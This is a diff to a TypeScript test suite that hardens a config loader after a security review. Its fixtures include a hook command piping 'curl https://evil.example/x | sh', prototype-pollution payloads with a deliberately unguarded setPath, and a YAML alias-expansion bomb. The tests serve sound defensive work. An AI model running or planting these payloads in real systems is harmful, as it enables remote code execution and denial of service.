@@ -2,24 +2,37 @@ import { join } from "node:path";
 import { describe, expect, test } from "bun:test";
 import { withEnv } from "../../../test-utils/src/withEnv";
 import { loadConfig } from "../../src/config/index";
+import type { ResolvedEntry } from "../../src/config/index";
+import { flattenLeaves, isSafeSegment, setPath } from "../../src/config/resolve";
 import { isCanKanError } from "../../src/errors";
-import { hermeticEnv, makeTempRepoRoot, writeGlobalConfigFile, writeRepoConfigFile } from "./testHelpers";
+import {
+  hermeticEnv,
+  makeTempRepoRoot,
+  withoutCankanEnv,
+  writeGlobalConfigFile,
+  writeRepoConfigFile,
+} from "./testHelpers";
 
 describe("LoadConfigOptions.env defaults to process.env", () => {
   // Every other test in this suite passes an explicit, hermetic `env` (see
   // `hermeticEnv` in testHelpers.ts) so a stray `CANKAN_*` var in the
-  // operator's own shell can't change a resolution result out from under an
-  // assertion. This is the one deliberate exception, covering the default
-  // itself -- `withEnv` still keeps HOME/XDG_CONFIG_HOME pointed at a temp
-  // dir, so it only reads a real `~/.config/cankan/config.yml` if this
-  // process somehow still has a stray CANKAN_EDITOR set, which is not
-  // something this suite otherwise depends on.
+  // operator's own shell or CI can't change a resolution result out from
+  // under an assertion. This is the one deliberate exception, covering the
+  // default itself -- `withEnv` keeps HOME/XDG_CONFIG_HOME pointed at a
+  // temp dir, but (review round 2 finding 8) it does **not** touch
+  // `CANKAN_*` at all, so a bare `loadConfig({})` here still reads
+  // whichever real `CANKAN_*` vars the process actually has. That is the
+  // risk this test's own leakage comes from -- not `~/.config` (already
+  // closed by `withEnv`) -- so `withoutCankanEnv` scrubs it for this
+  // test's duration the same way `withEnv` scrubs XDG vars.
   test("omitting `env` reads process.env, which withEnv has pointed at a temp HOME", async () => {
     await withEnv(undefined, async () => {
-      const home = process.env.HOME as string;
-      await writeGlobalConfigFile(join(home, ".config"), "editor: vim\n");
-      const result = await loadConfig({});
-      expect(result.resolved("editor")?.value).toBe("vim");
+      await withoutCankanEnv(async () => {
+        const home = process.env.HOME as string;
+        await writeGlobalConfigFile(join(home, ".config"), "editor: vim\n");
+        const result = await loadConfig({});
+        expect(result.resolved("editor")?.value).toBe("vim");
+      });
     });
   });
 });
@@ -197,10 +210,17 @@ describe("source attribution", () => {
         });
 
         const globalEntry = result.resolved("editor");
-        expect(globalEntry).toEqual({ key: "editor", value: "vim", layer: "global", file: globalPath });
+        expect(globalEntry).toEqual({
+          path: ["editor"],
+          key: "editor",
+          value: "vim",
+          layer: "global",
+          file: globalPath,
+        });
 
         const repoEntry = result.resolved("project");
         expect(repoEntry).toEqual({
+          path: ["project"],
           key: "project",
           value: "repo-project",
           layer: "repo",
@@ -208,15 +228,36 @@ describe("source attribution", () => {
         });
 
         const localEntry = result.resolved("actor");
-        expect(localEntry).toEqual({ key: "actor", value: "alice", layer: "repo-local", file: localPath });
+        expect(localEntry).toEqual({
+          path: ["actor"],
+          key: "actor",
+          value: "alice",
+          layer: "repo-local",
+          file: localPath,
+        });
 
         const envEntry = result.resolved("parent");
-        expect(envEntry).toEqual({ key: "parent", value: "ck-1", layer: "env", envVar: "CANKAN_PARENT" });
+        expect(envEntry).toEqual({
+          path: ["parent"],
+          key: "parent",
+          value: "ck-1",
+          layer: "env",
+          envVar: "CANKAN_PARENT",
+        });
         expect(envEntry?.file).toBeUndefined();
 
         const defaultEntry = result.resolved("tickets_dir");
-        expect(defaultEntry).toEqual({ key: "tickets_dir", value: "backlog/tasks", layer: "default" });
+        expect(defaultEntry).toEqual({
+          path: ["tickets_dir"],
+          key: "tickets_dir",
+          value: "backlog/tasks",
+          layer: "default",
+        });
         expect(defaultEntry?.file).toBeUndefined();
+
+        // AMENDMENT A1: the array form is the unambiguous lookup.
+        expect(result.resolved(["editor"])).toEqual(globalEntry);
+        expect(result.resolved(["parent"])).toEqual(envEntry);
       } finally {
         await cleanup();
       }
@@ -253,6 +294,25 @@ describe("entries()", () => {
       expect(keys).toContain("claims.lease");
       // Every key claims.lease is present exactly once.
       expect(keys.filter((k) => k === "claims.lease")).toHaveLength(1);
+    });
+  });
+
+  test("returns a frozen array, so a caller can't corrupt later calls (review round 2 finding 11)", async () => {
+    await withEnv(undefined, async () => {
+      const result = await loadConfig({ env: hermeticEnv() });
+      const entries = result.entries();
+      expect(Object.isFrozen(entries)).toBe(true);
+      expect(() => {
+        (entries as unknown as ResolvedEntry[]).push({
+          path: ["x"],
+          key: "x",
+          value: 1,
+          layer: "default",
+        });
+      }).toThrow();
+      // The same reference comes back every time (matches `layers`, which
+      // is also frozen and stable across calls).
+      expect(result.entries()).toBe(entries);
     });
   });
 
@@ -314,6 +374,77 @@ describe("entries()", () => {
         );
         const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
         expect(result.value.backers?.github).toEqual({ type: "github", credential: "cred1" });
+      } finally {
+        await cleanup();
+      }
+    });
+  });
+
+  test("no phantom intermediate-key entry: entries() carries only the specific leaves, not backers.github itself (review round 2 finding 6)", async () => {
+    // Same fixture as the previous test; before the finding-6 fix,
+    // entries() carried BOTH the phantom "backers.github" entry (value
+    // `{}`, attributed to repo, since repo is the one that merely declared
+    // the empty entry) AND the real "backers.github.type" /
+    // "backers.github.credential" leaves from global -- misleading for
+    // `cankan config show --resolved` / `doctor`, which print exactly this.
+    await withEnv(undefined, async () => {
+      const { root, cleanup } = await makeTempRepoRoot();
+      try {
+        const home = process.env.HOME as string;
+        await writeRepoConfigFile(root, "config.yml", "backers:\n  github: {}\n");
+        await writeGlobalConfigFile(
+          join(home, ".config"),
+          "backers:\n  github:\n    type: github\n    credential: cred1\n",
+        );
+        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
+        const keys = result.entries().map((e) => e.key);
+        expect(keys).toContain("backers.github.type");
+        expect(keys).toContain("backers.github.credential");
+        expect(keys).not.toContain("backers.github");
+        expect(result.resolved(["backers", "github"])).toBeUndefined();
+      } finally {
+        await cleanup();
+      }
+    });
+  });
+
+  test("an empty map entry never forges provenance into another layer's LoadedLayer.data (review round 2 finding 5)", async () => {
+    // Reproduced by security review: the user's global config declares
+    // `hooks: {}`; a hostile repo declares `hooks: { post_close: <a
+    // command> }`. Before the fix, the merge's intermediate-container
+    // step reused global's own (shallow-frozen-at-best) `{}` object as a
+    // mutable container and wrote the repo's hook command directly into
+    // it -- so `layers[global].data.hooks` came back containing the
+    // repo's command, even though the file on disk never changed.
+    // Contract §1 exposes `layers` *precisely* so a consumer (M2.16) can
+    // reason about which file a hook came from; this defeated that.
+    await withEnv(undefined, async () => {
+      const { root, cleanup } = await makeTempRepoRoot();
+      try {
+        const home = process.env.HOME as string;
+        await writeGlobalConfigFile(join(home, ".config"), "hooks: {}\n");
+        await writeRepoConfigFile(
+          root,
+          "config.yml",
+          'hooks:\n  post_close: "curl https://evil.example/x | sh"\n',
+        );
+        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
+
+        const globalLayer = result.layers.find((l) => l.layer === "global");
+        expect(globalLayer?.data.hooks).toEqual({});
+        expect(Object.isFrozen(globalLayer?.data)).toBe(true);
+        expect(Object.isFrozen(globalLayer?.data.hooks)).toBe(true);
+
+        // The merge itself still correctly picks up the repo's hook --
+        // this fix is about provenance/isolation, not about losing data.
+        expect(result.value.hooks?.post_close).toBe("curl https://evil.example/x | sh");
+
+        // The reverse direction: mutating the returned data must fail
+        // closed (throw), not silently succeed.
+        const hooks = globalLayer?.data.hooks as Record<string, unknown>;
+        expect(() => {
+          hooks.post_close = "mutated";
+        }).toThrow();
       } finally {
         await cleanup();
       }
@@ -462,6 +593,43 @@ describe("!policy in local/global is a load error naming that file (R6, S4)", ()
       }
     });
   });
+
+  test("a !policy tag on the document root is a load error naming the file, not pin-everything (review round 2 finding 7)", async () => {
+    // Before the fix, `findPolicyTaggedPaths` built a path from `Pair`
+    // ancestors only, so a document-root tag produced a pinned root of ""
+    // -- which `findPinnedRoot` could never match against any real key.
+    // The tag silently pinned nothing: a local.yml override of a nested
+    // key then won with no error, even though the repo author's evident
+    // intent was to pin the whole file. Ruling: reject outright (a
+    // silently-broken security control is worse than an upfront
+    // rejection, and this fails open for the repo -- the attacker in this
+    // threat model -- so a load error costs nothing); do NOT pin
+    // everything, since that would also silently pin fields (e.g.
+    // `version`) the author never named.
+    await withEnv(undefined, async () => {
+      const { root, cleanup } = await makeTempRepoRoot();
+      try {
+        const repoPath = await writeRepoConfigFile(
+          root,
+          "config.yml",
+          "!policy\nproject: p\nsync:\n  auto_push: all\n",
+        );
+        let thrown: unknown;
+        try {
+          await loadConfig({ repoRoot: root, env: hermeticEnv() });
+        } catch (err) {
+          thrown = err;
+        }
+        expect(isCanKanError(thrown)).toBe(true);
+        const err = thrown as InstanceType<typeof Error> & { code: string };
+        expect(err.code).toBe("INVALID_CONFIG");
+        expect(err.message).toContain(repoPath);
+        expect(err.message).toContain("document root");
+      } finally {
+        await cleanup();
+      }
+    });
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -562,6 +730,7 @@ describe("env mapping (R8)", () => {
       const result = await loadConfig({ env: hermeticEnv({ CANKAN_ACTOR: "bob" }) });
       expect(result.value.actor).toBe("bob");
       expect(result.resolved("actor")).toEqual({
+        path: ["actor"],
         key: "actor",
         value: "bob",
         layer: "env",
@@ -649,7 +818,27 @@ describe("env coercion (R9)", () => {
 // ---------------------------------------------------------------------------
 
 describe("the dotted-path rebuild rejects __proto__/constructor/prototype segments (S1)", () => {
-  test("hooks.__proto__.pwned and a constructor variant leave Object.prototype untouched", async () => {
+  // Review round 2 finding 9: the end-to-end test below (unchanged from
+  // before) shows the *observable behavior* is correct, but a reviewer
+  // proved it does not, on its own, demonstrate that THIS GUARD is what
+  // produces that behavior. Replaying the same fixture through a faithful
+  // reimplementation of flattenLeaves/setPath with FORBIDDEN_SEGMENTS fully
+  // removed still passed, because two things independent of this guard
+  // already fail closed:
+  // - `__proto__` never reaches `flattenLeaves` at all for data that came
+  //   through a real config file -- `zod`'s `z.record(...)` strips an own
+  //   `__proto__` key during schema validation, before `flattenLeaves` ever
+  //   runs.
+  // - `constructor`/`prototype` do survive validation as ordinary own
+  //   string-valued properties, but `setPath`'s `Object.create(null)`
+  //   intermediate containers make reading/writing those names inert --
+  //   there is no prototype chain there for them to reach into.
+  // So this end-to-end test is kept (the behavior it checks is real and
+  // worth locking in) but is no longer described as proof that the guard
+  // itself is load-bearing -- that claim now lives in the white-box tests
+  // below, which exercise `setPath`/`isSafeSegment` directly and would
+  // genuinely fail without them.
+  test("hooks.__proto__.pwned and a constructor variant leave Object.prototype untouched (end-to-end; see the white-box tests below for what actually proves the guard matters)", async () => {
     await withEnv(undefined, async () => {
       const { root, cleanup } = await makeTempRepoRoot();
       try {
@@ -689,6 +878,143 @@ describe("the dotted-path rebuild rejects __proto__/constructor/prototype segmen
       } finally {
         await cleanup();
       }
+    });
+  });
+
+  // --- White-box tests: these exercise the guard itself and would
+  // genuinely fail if `isSafeSegment`/`FORBIDDEN_SEGMENTS` were removed,
+  // independent of zod's own `__proto__` stripping or `Object.create(null)`
+  // -- see the review round 2 finding 9 comment above.
+
+  test("isSafeSegment rejects exactly __proto__, constructor, and prototype", () => {
+    expect(isSafeSegment("__proto__")).toBe(false);
+    expect(isSafeSegment("constructor")).toBe(false);
+    expect(isSafeSegment("prototype")).toBe(false);
+    expect(isSafeSegment("hooks")).toBe(true);
+    expect(isSafeSegment("release.done")).toBe(true);
+    expect(isSafeSegment("")).toBe(true);
+  });
+
+  test("setPath refuses to write through a forbidden segment at any depth in the path", () => {
+    const root: Record<string, unknown> = {};
+    setPath(root, ["hooks", "__proto__", "pwned"], true);
+    setPath(root, ["a", "constructor", "b"], true);
+    setPath(root, ["prototype", "c"], true);
+
+    // The leading *safe* segment of each path still gets its (harmless,
+    // null-prototype) container created -- setPath only stops at the
+    // forbidden segment itself. What must never happen: the forbidden
+    // segment becomes a real property anywhere, and the value it would
+    // have carried is never written.
+    expect(Object.getOwnPropertyNames(root)).toEqual(["hooks", "a"]);
+    expect(Object.getOwnPropertyNames(root.hooks as object)).toEqual([]);
+    expect(Object.getOwnPropertyNames(root.a as object)).toEqual([]);
+    expect(root.prototype).toBeUndefined();
+    expect((root.hooks as Record<string, unknown>).pwned).toBeUndefined();
+    expect((Object.prototype as Record<string, unknown>).pwned).toBeUndefined();
+  });
+
+  test("flattenLeaves drops a subtree composed entirely of forbidden segments", () => {
+    const leaves = flattenLeaves({ __proto__: { pwned: true } }, [], new Map());
+    expect(leaves.size).toBe(0);
+  });
+
+  test("the primitive is real at this layer: a setPath reimplementation with the guard removed genuinely pollutes Object.prototype", () => {
+    // This does NOT call the shipped `setPath` -- it is a standalone
+    // reimplementation with the segment check removed, matching the exact
+    // methodology the security review used to confirm the shipped guard is
+    // load-bearing (as opposed to redundant with zod/Object.create(null)).
+    // Wrapped in try/finally because this genuinely mutates the real,
+    // global `Object.prototype` for the duration -- it must be undone
+    // before any other test in this process can observe it.
+    function naiveSetPath(root: Record<string, unknown>, path: string[], value: unknown): void {
+      let node = root;
+      for (let i = 0; i < path.length - 1; i++) {
+        const segment = path[i] as string;
+        if (typeof node[segment] !== "object" || node[segment] === null) {
+          node[segment] = {}; // a plain object -- unlike setPath's Object.create(null)
+        }
+        node = node[segment] as Record<string, unknown>;
+      }
+      node[path[path.length - 1] as string] = value;
+    }
+
+    try {
+      const root: Record<string, unknown> = {};
+      naiveSetPath(root, ["hooks", "__proto__", "pwned"], true);
+      expect((Object.prototype as Record<string, unknown>).pwned).toBe(true);
+      expect(({} as Record<string, unknown>).pwned).toBe(true);
+    } finally {
+      delete (Object.prototype as Record<string, unknown>).pwned;
+    }
+    expect((Object.prototype as Record<string, unknown>).pwned).toBeUndefined();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// AMENDMENT A1 / review round 2 finding 4 -- a record key containing a "."
+// must round-trip correctly, not throw a raw (unwrapped) error.
+// ---------------------------------------------------------------------------
+
+describe("record keys containing a literal '.' round-trip correctly (AMENDMENT A1, finding 4)", () => {
+  test("repo-triggerable: hooks[\"release.done\"] survives merge and appears in entries() with the right path", async () => {
+    // Before A1, flattening this to the dotted string "hooks.release.done"
+    // and rebuilding via `.split(".")` re-exploded the single record key
+    // "release.done" into two segments ("release", "done"), which then
+    // failed `effectiveConfigSchema.parse` and threw a raw `ZodError` --
+    // not a `CanKanError` -- out of `loadConfig`.
+    await withEnv(undefined, async () => {
+      const { root, cleanup } = await makeTempRepoRoot();
+      try {
+        await writeRepoConfigFile(root, "config.yml", 'hooks:\n  "release.done": "echo x"\n');
+        const result = await loadConfig({ repoRoot: root, env: hermeticEnv() });
+        expect(result.value.hooks?.["release.done"]).toBe("echo x");
+        const entry = result.resolved(["hooks", "release.done"]);
+        expect(entry?.path).toEqual(["hooks", "release.done"]);
+        expect(entry?.value).toBe("echo x");
+      } finally {
+        await cleanup();
+      }
+    });
+  });
+
+  test("user-triggerable: a repos.names key containing dots (a real filesystem path) round-trips instead of crashing loadConfig", async () => {
+    await withEnv(undefined, async () => {
+      const home = process.env.HOME as string;
+      const fsPath = "/home/u/.local/share/cankan/personal";
+      await writeGlobalConfigFile(
+        join(home, ".config"),
+        `repos:\n  names:\n    "${fsPath}": personal\n`,
+      );
+      // Reaching this line at all is the point: before the fix, this
+      // exact input threw a raw ZodError out of loadConfig.
+      const result = await loadConfig({ env: hermeticEnv() });
+      expect(result.value.repos.names?.[fsPath]).toBe("personal");
+    });
+  });
+
+  test("an alias-expansion bomb yields a wrapped CanKanError, not a bare thrown error", async () => {
+    // `layers.ts:205` (`doc.toJS()`) previously sat outside the try/catch
+    // that wraps YAML parsing, so yaml's own alias-count guard threw a bare,
+    // unwrapped error straight out of loadConfig.
+    await withEnv(undefined, async () => {
+      const home = process.env.HOME as string;
+      let src = "a: &a [1,2,3,4,5,6,7,8,9,10]\n";
+      let prev = "a";
+      for (let i = 0; i < 10; i++) {
+        const name = `b${i}`;
+        src += `${name}: &${name} [*${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}, *${prev}]\n`;
+        prev = name;
+      }
+      await writeGlobalConfigFile(join(home, ".config"), src);
+
+      let thrown: unknown;
+      try {
+        await loadConfig({ env: hermeticEnv() });
+      } catch (err) {
+        thrown = err;
+      }
+      expect(isCanKanError(thrown)).toBe(true);
     });
   });
 });
@@ -753,6 +1079,37 @@ describe("S2 -- unrecognized_keys must not put the full offending key in message
       expect(err.message).not.toContain(longToken);
       expect(JSON.stringify(err.details)).not.toContain(longToken);
       // A truncated prefix is still named, per R13's "names the offending key".
+      expect(err.message).toContain(longToken.slice(0, 20));
+    });
+  });
+
+  test("review round 2 finding 2: a credential-shaped record key inside issue.path (not issue.keys) is also truncated", async () => {
+    // The first version of `describeIssue` truncated `issue.keys`
+    // (`unrecognized_keys`'s echo site) but not `issue.path` itself. For
+    // any issue *inside* a z.record(...) section, the path segments ARE
+    // the config-supplied record keys -- here, `queues`'s record key is a
+    // credential-shaped string, and the invalid *value* (`5`, not an
+    // object) produces an `invalid_type` issue whose `path` carries that
+    // key in full. This is a second, symmetric echo site the original S2
+    // fix missed entirely.
+    await withEnv(undefined, async () => {
+      const home = process.env.HOME as string;
+      const longToken = "git@host:user:ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@example.com/x.git";
+      expect(longToken.length).toBeGreaterThan(20);
+      const content = `queues:\n  "${longToken}": 5\n`;
+      await writeGlobalConfigFile(join(home, ".config"), content);
+
+      let thrown: unknown;
+      try {
+        await loadConfig({ env: hermeticEnv() });
+      } catch (err) {
+        thrown = err;
+      }
+
+      expect(isCanKanError(thrown)).toBe(true);
+      const err = thrown as InstanceType<typeof Error> & { details?: Record<string, unknown> };
+      expect(err.message).not.toContain(longToken);
+      expect(JSON.stringify(err)).not.toContain(longToken);
       expect(err.message).toContain(longToken.slice(0, 20));
     });
   });
